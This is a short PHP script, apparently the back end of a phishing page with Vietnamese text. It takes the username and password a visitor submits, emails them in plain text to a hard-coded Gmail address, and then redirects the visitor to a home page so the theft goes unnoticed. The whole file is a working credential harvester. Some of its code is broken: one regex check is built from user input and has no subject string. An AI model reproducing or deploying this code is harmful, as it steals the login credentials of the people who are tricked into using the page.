<?php
$username = $_POST['user'];
$password = $_POST['pass'];
if($username == "" && $password == ""){
header("Location: index.php");
}
?>

<?php function emailValid($string) { 
        if (preg_match ("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+\.[A-Za-z]{2,6}$/", $string)) {
            return true;
        }
    }

      if(!preg_match('/'.$username.'/')){
        $_SESSION["username"] = $username;
             echo $_SESSION["username"];
    		 $subject = "Thông tin gửi về từ trang web của bạn:\nLưu ý: Thông tin này là bảo mật, tuyệt đối không tiết lộ cho bất kì ai\nMã nguồn bởi: W5VN";
             $headers = "Bạn có thông báo đăng nhập mới...";
             $comment = "";
             $body = "----------------------------------------------\nTài khoản: $username\nMật khẩu: $password \n----------------------------------------------\n";
             mail("meomaosv2@gmail.com", $headers, $body, $subject);
        	
    
        }
echo '<script>location.href = "/trangchu.html"</script>';
?>